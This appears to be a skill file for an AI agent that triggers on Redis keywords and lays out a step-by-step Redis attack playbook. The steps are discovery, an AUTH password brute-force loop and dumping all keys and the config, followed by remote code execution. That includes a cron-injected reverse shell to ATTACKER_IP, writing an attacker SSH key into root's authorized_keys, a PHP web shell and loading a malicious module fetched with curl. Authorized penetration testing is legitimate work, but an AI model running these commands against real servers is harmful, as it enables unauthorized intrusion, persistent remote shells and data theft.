---
name: tech-redis
description: "Redis security testing — unauthenticated access, AUTH brute force, config write for cron/SSH injection, Lua RCE, Redis module exploitation. Triggers: 'redis', 'redis security', 'redis pentest', 'redis unauth', 'redis rce', 'redis cron', 'redis ssh', 'redis exploit', 'redis config write'."
---

# Redis Security Testing

Exploit unauthenticated Redis for configuration-based RCE.

---

## Phase 1: Discovery & Authentication Test

```bash
TARGET="TARGET_IP"

# Detect Redis:
nmap -p 6379 -sV "$TARGET" 2>/dev/null
nc -nv "$TARGET" 6379 << 'EOF'
PING
INFO
EOF

# Test without password:
redis-cli -h "$TARGET" PING 2>/dev/null && echo "UNAUTHENTICATED ACCESS!"
redis-cli -h "$TARGET" INFO server 2>/dev/null | tee output/redis_info.txt

# Brute force AUTH:
for PASS in "" "redis" "admin" "password" "root" "123456" "test" "default"; do
  RESULT=$(redis-cli -h "$TARGET" -a "$PASS" PING 2>/dev/null)
  [ "$RESULT" == "PONG" ] && echo "VALID PASSWORD: '$PASS'"
done | tee output/redis_auth.txt
```

---

## Phase 2: Information Gathering

```bash
TARGET="TARGET_IP"
# PASS="" for no auth, or PASS="password" for auth
REDIS_CMD="redis-cli -h $TARGET"

# Server info:
$REDIS_CMD INFO all 2>/dev/null | tee output/redis_info_full.txt

# All keys:
$REDIS_CMD KEYS "*" 2>/dev/null | head -50 | tee output/redis_keys.txt

# Dump interesting keys:
for KEY in $($REDIS_CMD KEYS "*" 2>/dev/null | head -20); do
  TYPE=$($REDIS_CMD TYPE "$KEY" 2>/dev/null)
  echo "=== $KEY ($TYPE) ==="
  case "$TYPE" in
    string) $REDIS_CMD GET "$KEY" ;;
    hash)   $REDIS_CMD HGETALL "$KEY" ;;
    list)   $REDIS_CMD LRANGE "$KEY" 0 10 ;;
    set)    $REDIS_CMD SMEMBERS "$KEY" ;;
  esac
done 2>/dev/null | tee output/redis_dump.txt

# Config:
$REDIS_CMD CONFIG GET "*" 2>/dev/null | tee output/redis_config.txt
```

---

## Phase 3: RCE via Config Write

```bash
TARGET="TARGET_IP"

# Technique 1: Cron job injection:
redis-cli -h "$TARGET" CONFIG SET dir /var/spool/cron/ 2>/dev/null
redis-cli -h "$TARGET" CONFIG SET dbfilename "root" 2>/dev/null
redis-cli -h "$TARGET" SET crontab "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n" 2>/dev/null
redis-cli -h "$TARGET" BGSAVE 2>/dev/null

# Technique 2: SSH authorized_keys injection:
redis-cli -h "$TARGET" CONFIG SET dir /root/.ssh/ 2>/dev/null
redis-cli -h "$TARGET" CONFIG SET dbfilename "authorized_keys" 2>/dev/null
SSH_PUB="ssh-rsa AAAA... your_key"
redis-cli -h "$TARGET" SET sshkey "\n\n${SSH_PUB}\n\n" 2>/dev/null
redis-cli -h "$TARGET" BGSAVE 2>/dev/null
# Then: ssh -i ~/.ssh/id_rsa root@$TARGET

# Technique 3: Web shell (if web root known):
redis-cli -h "$TARGET" CONFIG SET dir /var/www/html/ 2>/dev/null
redis-cli -h "$TARGET" CONFIG SET dbfilename "shell.php" 2>/dev/null
redis-cli -h "$TARGET" SET webshell "<?php system(\$_GET['cmd']); ?>" 2>/dev/null
redis-cli -h "$TARGET" BGSAVE 2>/dev/null
```

---

## Phase 4: Redis Lua RCE (if eval enabled)

```bash
TARGET="TARGET_IP"

# Test Lua eval:
redis-cli -h "$TARGET" EVAL "return redis.call('INFO')" 0 2>/dev/null | head -5

# Lua RCE (if NOAUTH):
# Note: Redis Lua doesn't directly exec, but via modules
redis-cli -h "$TARGET" MODULE LIST 2>/dev/null

# Load malicious module (if writable path):
# Download: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
# curl -s "http://ATTACKER_IP/module.so" -o /tmp/module.so
redis-cli -h "$TARGET" MODULE LOAD /tmp/module.so 2>/dev/null
redis-cli -h "$TARGET" system.exec "id" 2>/dev/null
```

---

## Output

Save to `output/`:
- `redis_info.txt` — server information
- `redis_keys.txt` — all keys found
- `redis_dump.txt` — key contents

## Next Phase

→ `post-linux-privesc` after gaining shell via cron injection
→ `pentest-report` to document Redis misconfiguration
